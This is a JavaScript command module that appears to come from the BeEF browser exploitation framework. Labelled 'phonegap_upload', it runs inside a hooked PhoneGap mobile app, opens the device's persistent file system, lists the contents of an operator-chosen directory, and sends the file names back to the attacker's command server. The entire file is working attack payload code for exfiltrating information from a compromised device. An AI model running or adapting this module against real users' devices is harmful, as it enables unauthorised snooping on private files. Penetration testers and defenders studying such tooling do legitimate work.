//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// phonegap_upload
//
beef.execute(function() {
    var directory = "<%== @directory %>";
    var result = '';

    function fail() {
        result = 'fail';
        
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
    }

    function success(entries) {
        var i;
        for (i=0; i<entries.length; i++) {
            result = result + '\n ' + entries[i].name;        
        }

        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
    } 

    // use directoryentry to create directory reader
    function gotDirEntry(dirEntry) {
        var directoryReader = dirEntry.createReader();
        directoryReader.readEntries(success,fail);
    }

    // use getDirectoy to create reference to directoryentry 
    function gotFS(fileSystem) {
        fileSystem.root.getDirectory(directory, null, gotDirEntry, fail);
    }
   
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);

});
